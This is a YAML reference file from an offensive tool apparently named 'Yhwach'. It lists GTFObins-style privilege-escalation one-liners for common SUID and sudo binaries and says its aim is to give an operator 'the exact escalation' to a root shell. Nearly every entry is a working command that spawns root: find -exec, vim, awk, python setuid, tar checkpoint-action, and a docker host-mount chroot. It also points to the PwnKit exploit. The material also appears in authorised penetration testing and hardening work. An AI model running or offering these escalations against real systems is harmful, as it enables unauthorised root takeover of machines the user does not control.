# Yhwach — GTFObins quick reference for the common SUID/sudo privesc binaries.
# `yhwach ref gtfobins [--query find]`. The linpeas parser flags the presence of
# these; this gives the operator the exact escalation without a browser.
# Each entry: the binary, and the sudo/suid one-liner to a root shell.

- bin: find
  sudo: "sudo find . -exec /bin/sh \\; -quit"
  suid: "./find . -exec /bin/sh -p \\; -quit"
- bin: vim
  sudo: "sudo vim -c ':!/bin/sh'"
  suid: "./vim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'"
- bin: nmap
  sudo: "sudo nmap --interactive  -> !sh   (old nmap only)"
- bin: less
  sudo: "sudo less /etc/profile  -> !/bin/sh"
- bin: awk
  sudo: "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
- bin: python
  sudo: "sudo python -c 'import os; os.system(\"/bin/sh\")'"
  suid: "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
- bin: perl
  sudo: "sudo perl -e 'exec \"/bin/sh\";'"
- bin: bash
  suid: "./bash -p"
- bin: cp
  suid: "# overwrite /etc/passwd with a root row, or copy a payload over a SUID target"
- bin: tar
  sudo: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
- bin: docker
  sudo: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh   (docker group == root)"
- bin: systemctl
  sudo: "sudo -> write a malicious .service ExecStart=/bin/sh and start it"
- bin: env
  sudo: "sudo env /bin/sh"
  suid: "./env /bin/sh -p"
- bin: pkexec
  note: "if present and vulnerable, see CVE-2021-4034 (PwnKit) in the CVE map"
